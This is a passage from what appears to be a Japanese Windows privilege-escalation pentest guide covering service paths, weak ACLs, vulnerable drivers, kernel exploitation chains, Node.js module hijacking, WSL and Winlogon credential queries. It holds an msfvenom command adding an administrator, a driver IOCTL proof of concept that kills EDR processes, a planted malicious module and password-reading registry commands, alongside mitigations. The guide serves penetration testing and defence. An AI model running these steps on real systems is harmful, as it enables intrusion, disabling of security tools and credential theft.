		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitでこの脆弱性を検出して悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploitでサービスバイナリを手動で作成できます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復操作

Windows では、サービスが失敗した場合に実行する操作をユーザーが指定できます。この機能は、バイナリを指定するように設定できます。そのバイナリを置き換え可能な場合、privilege escalation が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプトのターゲット

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` だけでなく、**アクション引数**で指定されているスクリプトも確認してください。PowerShell の `-File` など、インタープリターにファイルを明示的に渡す場合も同様です。スケジュールされたバッチファイルにリテラルの PowerShell `-File` 呼び出しが含まれている場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルの連結がある場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションに到達する場合に限り、アカウントをまたいだ実行の手掛かりとなります。スクリプトでは追記のみ可能な ACL が重要な場合がありますが、先行する `exit` やその他の制御フローによって、追記した行が実行されないこともあります。privilege escalation と判断する前に、有効な ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリの作成時に、スクリプトを変更したりタスクを開始したりしてはいけません。

## アクセス可能なファイル内の名前付きストリーム

NTFS では、読み取り可能なファイルに名前付きの `:$DATA` ストリームが含まれていても、通常のディレクトリ一覧にはその内容が表示されないことがあります。アクセス可能なバックアップファイルや設定ファイルのうち、関連性の高いものに絞って、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) を通じて、PowerShell では [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) を通じて確認できます。秘密情報を示唆するストリーム名は、あくまで手掛かりです。ファイルへの実効読み取りアクセス、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリーム検索やストリーム内容の表示は避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールされたタスクやサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限での書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながる可能性があります。特権で実行するプロセスがこれらの入力を読み込むこと、および**両方の**サイドカーファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

スケジュールされたタスクの場合は、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2つのサイドカーパスの ACL を確認してください。タスクに作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがその場所から入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。タスクは SYSTEM として実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして privilege escalation できる可能性があります）と、**フォルダ**の権限（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置き換えに失敗した際に既存の書き込み保護されたファイルを実行していた、古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストール済みの正確なパッチレベルと、影響を受ける agent の操作を実行できるかどうかを確認してください。`2.1` のようなブランチのみの表示では、影響の有無を判断できません。列挙では、ファイルの作成や agent コマンドの実行を行わずに、バージョン、サービスの状態、Temp のアクセス許可を調べられます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は build 6210 以前の ADSelfService Plus に影響し、ベンダーは build 6211 で修正しました。SAML SSO が有効**であるか、過去に有効だった場合に限り**関連します。そのため、インストール済み製品のエントリやサービスパスは手掛かりであり、脆弱性の判定ではありません。正確な build、SAML の設定履歴、サービスのネットワーク到達性、実行アカウントを確認してください。このサービスを介したコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM 権限で実行されるのは、SYSTEM で動作しているインスタンスに限られます。製品の Backup ディレクトリにある、読み取り可能な `OfflineBackup_*.ezip` は別の暗号化バックアップの手掛かりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権のみを記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows Jenkins controller では、job の作成または設定の権限と、job の開始権限を区別してください。[Jenkins ではこれらを別々の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別の build 経路になる場合もありますが、それが有効で、実際に build が実行されることを確認してください。実行時の ID は controller または選択された agent のものになり、保存済みの credential が使えるのは、job がそのスコープにアクセスできる場合に限られます。別途、`JENKINS_HOME` のメタデータへのアクセスを確認してください。Jenkins は credential の情報と暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保持します（[Jenkins の secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけではパスワードは判明しません。**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認し、共有出力に secrets を表示しないでください。そのアカウントが AD user object の `scriptPath` への書き込み権限を持つ場合は、対象ユーザーとして動作する実際のログオンまたはスケジュールされた実行主体が、その書き込み可能なスクリプトパスを利用することを確認してから、ユーザー間実行と判断してください。さらにグループを制御できるかどうかは、実効 AD 権限を別途確認する必要があります。

#### Azure Pipelines self-hosted agent の ID

Azure DevOps Server または Azure Pipelines project では、pipeline の**作成または編集**権限と、その pipeline を**キューに登録**して選択した agent pool を使う権限を区別してください。[Microsoft は pipeline の権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を個別に説明しています。低権限アカウントが script step を送信し、その pipeline を self-hosted Windows agent 上で実行できる場合、その step は[agent に設定されたオペレーティングシステムのアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザー間または SYSTEM への権限移行を主張する前に、対象の pipeline、ブランチやリソースの制限、認可された pool、実行可能な job、agent サービスの ID を確認してください。インストール済みの agent、project の role、または repository への書き込み権限だけでは手掛かりにすぎません。受動的な列挙では build を開始せずに、権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の credential

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL database にアクセスする **ADSync service account** と、ディレクトリ権限が設定済みの同期機能によって異なる **AD DS connector account** を区別しています。connector の credential はその database に暗号化して保存され、鍵の情報は[ADSync service account の下で DPAPI により保護されます](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者を想起させるグループがあること、database を参照できることだけでは、復号可能な credential やドメイン権限昇格があるとは判断できません。実際の database 読み取り権限、service account と鍵へのアクセス、インストールおよび SQL の構成、設定済みの connector identity、その identity が持つ実効 AD 権限をそれぞれ確認してください。通常の列挙ではサービスとアクセスのメタデータのみを表示し、保存された secrets の照会や表示は行わないでください。

#### プリンタードライバーの support DLL 権限

インストール済みのプリンタードライバーは、support DLL を `C:\ProgramData` に保持し、より高い権限を持つ print process で読み込む場合があります。プリンターの WMI 列挙が拒否されても、親ディレクトリや reparse point を含めて、対象ドライバーのディレクトリと DLL の ACL を確認してください。[Ricoh プリンタードライバーの問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` でした。[元の開示](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みについて説明されています。ACL が書き込み可能なのは手掛かりにすぎません。拒否エントリを考慮した実効的な書き込み権限、該当ドライバーがインストールされていて特権 ID でファイルを読み込むこと、ベンダーの更新済みドライバーやセキュリティプログラムでインストールが修正済みかどうかを確認してください。ディレクトリ名やドライバーのバージョンだけから脆弱性を推定しないでください。

### 書き込み権限

特別なファイルを読み取れるように設定ファイルを変更できるか、Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるか確認してください。

システム内の権限が弱いフォルダーやファイルを見つける方法は次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++は`plugins`サブフォルダ内の任意のplugin DLLを自動ロードします。書き込み可能なポータブル版またはコピー版のインストールが存在する場合、悪意のあるpluginを配置すると、起動するたびに（`DllMain`やpluginコールバックからも）`notepad++.exe`内でコードが自動実行されます。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリまたはバイナリを上書きできるか確認してください。**\
権限昇格に利用できる興味深い**自動実行の場所**について詳しく知るには、**次のページを読んでください**。

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審または脆弱な**ドライバーがないか探してください。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意のカーネル読み書きプリミティブ（設計の悪い IOCTL ハンドラーでよく見られる）を公開している場合、カーネルメモリから SYSTEM token を直接盗むことで権限昇格できます。<sup>[[13]](#references)</sup> 手順はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

関連する Windows kernel-exploitation の資料:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race-condition バグでは、lookup を意図的に遅くする（最大長のコンポーネントや深いディレクトリチェーンを使う）ことで、競合の時間を数マイクロ秒から数十マイクロ秒に延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、単体では弱い2つのバグから構築できるものがあります。1つは、キューロックを保持したまま request/CBD を解放する **cancel-safe queue の lifetime race**、もう1つは、`RtlCopyToUser` の間に解放済み paged-pool allocation の情報を漏らす **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査および exploitation のメモ:

- **ロック中に解放し、その後キャンセル**: 成功パスが **Acquire -> CompleteRequest/free -> Release** を実行し、キャンセルパスが **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。成功パスが CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていたスレッドが後で再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- **解放済み queue object を再利用**: 同じサイズの攻撃者制御 paged-pool allocation で再利用します。`NPFS` Data Queue Entries は、payload とサイズを制御でき、後から pipe の read/peek 操作で調べられるため有用です。解放済みオブジェクトに list links が含まれている場合は、それらを **user memory 内の偽 request node の循環リスト**で上書きします。これにより、元の list head で終了する代わりに、ドライバーは攻撃者定義の request structure を繰り返し処理します。
- **予測可能な write を強化**: 偽 request によって bookkeeping write（timestamps / QPC / refcount に隣接するフィールド）が使う nested context pointer を変更できる場合、**アドレスは制御できるが値は制御できない**カーネル write を得られることがあります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** フィールドを標的にし、破損したオブジェクトによって **out-of-bounds paged-pool read** が発生するまで spray を列挙します。
- **競合可能な disclosure のパターン**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、どれも有力候補です。攻撃者がコピー対象のバッファを拡大できる場合（たとえば、serializer の最終 allocation size を増やす多数の list/resource entry を追加するなど）、マシンをクラッシュさせずにコピー時間を延ばして置換可能な時間を広げられるため、成功率が向上します。
- **pointer が豊富な再充填対象**: Windows **I/O ring** の registered-buffer array は、paged-pool のサイズを攻撃者が制御でき（`8 * regBufferCnt`）、各要素が `_IOP_MC_BUFFER_ENTRY` へのカーネルポインターであるため、disclosure の標的として優れています。この array を1つ leak し、周囲の `IORING_OBJECT` を特定してから **`RegBuffers`** と **`RegBuffersCount`** を破損させることで、後続の I/O ring 操作に攻撃者が偽造した entry を使わせ、任意のカーネル読み書きを実現できます。利用可能な write が安定した1バイトの値しか与えない場合（たとえば `KUSER_SHARED_DATA+0x14` の値）、**アラインメントされていない重複 write** を使って `0x0101010101010101` のような同じバイトが繰り返される user pointer を構築し、`VirtualAlloc` でそのアドレスをマップして、そこに偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグ時に役立つ兆候:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once you obtain arbitrary kernel read/write from the corrupted I/O ring, 標準的な post-primitive workflow を使って SYSTEM token を奪取します:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive 脆弱性では、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子キーを悪用し、カスタムドライバーを使わずにメタデータの破損を kernel paged-pool overflow に変換できます。ここで一連の手順を学んでください:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる `RtlQueryRegistryValues` の direct-mode type confusion

一部のドライバーは userland からレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証した後、`RTL_QUERY_REGISTRY_DIRECT` を使って `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出し、`int readValue` のようなスタック上のスカラーに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に従って解釈されます。

これにより、2 つの有用なプリミティブが生まれます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` により、ドライバーに攻撃者が選んだキーを問い合わせさせることができます。戻り値やログを通じてキーの存在を漏らし、場合によっては呼び出し元が直接アクセスできない値を読み取れます。
- **Kernel memory corruption**: `&readValue` のようなスカラーの格納先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定付きバイナリバッファとして型の誤認を受けます。

実践的な悪用に関する注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**untrusted hive**を問い合わせると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能性を維持するには、`HKCU` 配下に値を配置するのではなく、**trusted system hive 内の攻撃者が書き込み可能なキー**を探してください。
- **Trusted-hive staging**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した**low-integrity** token を使ってスキャンを再実行すると、sandboxed context からアクセス可能なキーを見つけられます:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 8バイトの直接書き込みを4バイトの`int`に行うと、隣接するスタックデータが破損し、近くにあるコールバック／関数ポインターが部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが最初に攻撃者が制御する`REG_DWORD`をスタックスカラーに読み込み、その後、同じバッファーを文字列読み込みに再利用すると、攻撃者は`Length`／`MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、ある程度制御可能なkernel writeが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファーサイズとして扱います。先行する`REG_DWORD`の読み込みによって、再利用されるスカラーに攻撃者が制御する**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。これは多くの場合、コールバックポインターを完全に上書きする最も簡単な方法です。

強力なハンティングパターン: **同じスタック変数への、初期化し直さずに行う異種レジストリ読み込み**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、および最初のレジストリ読み込みによって2回目の読み込みを行うかどうかが決まるコードパスをgrepしてください。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPEN設定漏れの悪用（LPE + EDR kill）

一部の署名済みサードパーティ製ドライバーは、IoCreateDeviceSecureで強固なSDDLを指定してデバイスオブジェクトを作成しているものの、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れています。このフラグがない場合、余分なコンポーネントを含むパス経由でデバイスを開くときにセキュアDACLが適用されず、権限のないユーザーでも次のような名前空間パスを使ってハンドルを取得できます。<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際の事例より）

ユーザーがデバイスを開けると、ドライバーが公開する特権IOCTLを悪用してLPEや改ざんを行えます。実際に確認された機能の例:
- 任意のプロセスに対するフルアクセスハンドルの返却（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw diskの読み書き（オフライン改ざん、起動時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、user landからkernel経由でAV/EDR killが可能。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLでアクセスを制限するデバイスオブジェクトを作成する場合は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加する。
- IOCTLs を制限する（アクセスマスク、METHOD_*、入力検証）。カーネル特権を直接使用する代わりに、brokered モデルの採用も検討する。

防御側の検知アイデア
- 疑わしいデバイス名（例：`\\ .\\amsdk*`）に対するユーザーモードからの open や、不正利用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny list を維持する。


## PATH DLL Hijacking

**PATH 上のフォルダー内に書き込み権限**がある場合、プロセスによって読み込まれる DLL を hijack し、**権限昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーのアクセス許可を確認します：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron モジュール解決の乗っ取り

これは、期待されるモジュールが**見つからない**場合に、`require("foo")` のような bare import を実行する **Node.js** および **Electron** アプリケーションに影響する、**Windows の制御されていない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリの `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この検索がドライブのルートまで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を検索することがあります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低い権限を持つユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を仕掛け、**より高い権限で実行される Node/Electron プロセス**が、見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者権限で実行される場合、昇格されたスケジュールタスク／サービスラッパーから実行される場合、または特権を持つデスクトップアプリとして自動起動される場合、これは **LPE** につながります。

これは、特に次のような場合によく発生します。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗時にも処理を続行する
- パッケージが本番ビルドから削除された、パッケージ化時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い階層にある

### 脆弱な対象の調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` に `node_modules` が `contains` される条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションのソースで役立つコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### 悪用

1. Procmon またはソースのレビューから**不足しているパッケージ名**を特定します。
2. ルートの検索ディレクトリが存在しない場合は作成します:

```powershell
mkdir C:\node_modules
```

3. 想定される正確な名前のモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害アプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込むことがあります。

このパターンに当てはまる、実際に存在する欠落した optional module の例として `bluebird` と `utf-8-validate` があります。ただし、再利用できるのは**手法**です。特権で動作する Windows Node/Electron プロセスが解決する、あらゆる**欠落した bare import**を見つけてください。

### 検知とハードニングのアイデア

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルやパッケージを書き込んだりした場合にアラートを出す。
- 高い整合性レベルで動作するプロセスが `C:\node_modules\*` から読み込んでいないか調査する。
- 本番環境ではすべてのランタイム依存関係をパッケージに含め、`optionalDependencies` の使用状況を監査する。
- サードパーティーコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認する。
- ライブラリが対応している場合は、optional probe を無効にする（たとえば、一部の `ws` のデプロイでは `WS_NO_UTF_8_VALIDATE=1` を指定して、レガシーな `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hostsファイル

hostsファイルにハードコードされている、既知の他のコンピューターを確認します。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースとDNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールされたタスクと照合します。リモートコントロールサービスがデスクトップユーザーとしてアクセスを許可するかどうかは、認証とコマンド制御の設定によります。より高い権限のアカウントで実行されているカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは手掛かりにすぎず、認証を要するメモリ破損の経路を確認するには、そのバイナリと到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、転送先に到達可能であることや脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォールルール

[**ファイアウォール関連のコマンドについては、このページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

rootユーザーを取得すると、任意のポートで listen できます（初めて `nc.exe` を使ってポートを listen するときは、ファイアウォールで `nc` を許可するかどうかを GUI で尋ねられます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

root として bash を簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで `WSL` のファイルシステムを確認できます。

WSL 内の Linux の `root` 権限だけでは、Windows の Administrator 権限は付与されません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドによって認証情報が記録されている可能性があるため、シェルの履歴ファイル（`/root/.bash_history` を含む）を確認してください。ただし、権限昇格には引き続き、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに該当します。WSL 2 では、一般にディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙では、履歴の内容を出力しないようにしてください。

## Windows の認証情報

### Winlogon の認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
